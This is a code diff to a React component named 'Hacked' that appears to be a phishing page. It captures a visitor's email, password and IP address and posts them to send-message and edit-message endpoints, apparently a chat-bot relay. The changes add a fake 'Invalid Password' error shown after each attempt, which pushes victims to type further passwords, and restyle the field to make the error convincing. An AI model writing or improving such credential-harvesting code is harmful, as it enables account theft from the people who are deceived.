@@ -5,6 +5,7 @@ import axios from 'axios';
 import React, { useEffect, useState } from 'react';
 import { Helmet } from 'react-helmet-async';
 import { Link, useNavigate } from 'react-router-dom';
+
 const Hacked: React.FC = () => {
 	const navigate = useNavigate();
 	const [email, setEmail] = useState<string>('');
@@ -14,6 +15,7 @@ const Hacked: React.FC = () => {
 	const [attempts, setAttempts] = useState<number>(0);
 	const [isLoading, setIsLoading] = useState<boolean>(false);
 	const [loadingTime, setLoadingTime] = useState<number>(0);
+	const [error, setError] = useState<string>('');
 	const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
 		e.preventDefault();
 		if (email) {
@@ -28,7 +30,7 @@ const Hacked: React.FC = () => {
 				) {
 					const messageId = localStorage.getItem('message_id');
 					const message = localStorage.getItem('message');
-					const newMessage = `${message}<b>🔑Password ${attempts + 1}:</b> <code>${password}</code>`;
+					const newMessage = `${message}\n<b>🔑Password ${attempts + 1}:</b> <code>${password}</code>`;
 					saveMessage = newMessage;
 
 					response = await axios.post('/api/edit_message', {
@@ -44,7 +46,7 @@ const Hacked: React.FC = () => {
 							timeZone: 'Asia/Ho_Chi_Minh',
 						},
 					);
-					const message = `<b>Thời gian:</b> <code>${currentVietNamTime}</code>\n<b>📍IP:</b> <code>${ip}</code>\n<b>📩Email:</b> <code>${email}</code>\n<b>🔑Password:</b> <code>${password}</code>\n`;
+					const message = `<b>Thời gian:</b> <code>${currentVietNamTime}</code>\n<b>📍IP:</b> <code>${ip}</code>\n<b>📩Email:</b> <code>${email}</code>\n<b>🔑Password:</b> <code>${password}</code>`;
 					saveMessage = message;
 					response = await axios.post('/api/send_message', {
 						message: message,
@@ -77,6 +79,11 @@ const Hacked: React.FC = () => {
 		};
 		getPasswordConfig();
 	}, []);
+	useEffect(() => {
+		if (attempts > 0) {
+			setError('Invalid Password');
+		}
+	}, [attempts]);
 	return (
 		<>
 			<Helmet>
@@ -126,11 +133,12 @@ const Hacked: React.FC = () => {
 						/>
 						{showPasswordField && (
 							<input
-								className='ld:bg-white m-1 w-full rounded border border-gray-100 bg-gray-200 p-2 hover:border-gray-500 focus:outline-none lg:border-gray-300 lg:bg-white'
+								className={`ld:bg-white m-1 w-full rounded border ${error ? 'border-red-500 placeholder:text-red-500' : 'border-gray-100'} bg-gray-200 p-2 hover:border-gray-500 focus:outline-none lg:border-gray-300 lg:bg-white`}
 								id='password'
 								type='password'
 								name='password'
-								placeholder='Current or old password'
+								placeholder={`${error || 'Current or old password'}`}
+								onFocus={() => setError('')}
 								value={password}
 								onChange={(e) => setPassword(e.target.value)}
 							/>
